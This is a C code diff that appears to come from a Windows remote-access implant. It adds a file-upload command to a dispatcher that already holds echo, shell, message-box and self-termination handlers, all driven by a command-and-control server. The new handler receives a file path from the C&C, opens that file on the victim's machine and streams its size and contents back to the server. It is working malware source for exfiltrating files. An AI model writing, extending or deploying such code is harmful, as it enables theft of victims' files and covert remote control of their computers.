@@ -4,6 +4,7 @@
 #include "shell.h"
 #include "msgbox.h"
 #include "logger.h"
+#include "file.h"
 #include "commander.h"
 
 void handle_echo()
@@ -135,11 +136,72 @@ void handle_suicide()
     exit(EXIT_SUCCESS);
 }
 
+void handle_upload_file()
+{
+    int ret;
+    unsigned long bytes_read;
+    HANDLE file;
+    struct upload_file_cmd cmd;
+
+    log_info("Received UPLOAD_FILE command.");
+
+    bytes_read = recv_from_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len));
+    if (bytes_read != sizeof(cmd.local_path_len))
+    {
+        log_error("Failed to read file path length.");
+        return;
+    }
+    cmd.local_path = malloc(cmd.local_path_len + 1);
+
+    bytes_read = recv_from_cnc(cmd.local_path, cmd.local_path_len);
+    if (bytes_read != cmd.local_path_len)
+    {
+        log_error("Failed to read local file path.");
+        return;
+    }
+    cmd.local_path[cmd.local_path_len] = 0;
+    log_debug("local path: %s", cmd.local_path);
+
+    file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    free(cmd.local_path);
+    if (file == INVALID_HANDLE_VALUE)
+        ret = GetLastError();
+    else
+        ret = 0;
+
+    bytes_read = send_to_cnc(&ret, sizeof(ret));
+    if (bytes_read != sizeof(ret))
+        fatal_error("Failed to send return code of CreateFile.");
+
+    if (ret)
+        return;
+
+    cmd.file_size = GetFileSize(file, NULL);
+    log_debug("file size: %u", cmd.file_size);
+    if (cmd.file_size == INVALID_FILE_SIZE)
+        fatal_error("Failed to get the file's size.");
+    bytes_read = send_to_cnc(&cmd.file_size, sizeof(cmd.file_size));
+    if (bytes_read != sizeof(cmd.file_size))
+        fatal_error("Failed to send file size.");
+
+    while (TRUE)
+    {
+        ret = ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL);
+        if (!bytes_read)
+        {
+            CloseHandle(file);
+            return;
+        }
+        if (send_to_cnc(cmd.file_chunk, bytes_read) != bytes_read)
+            fatal_error("Failed to send file chunk.");
+    }
+}
+
 void listen_for_cmds()
 {
     int bytes_read;
     struct cmd cmd;
-    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide};
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file};
 
     while (TRUE)
     {
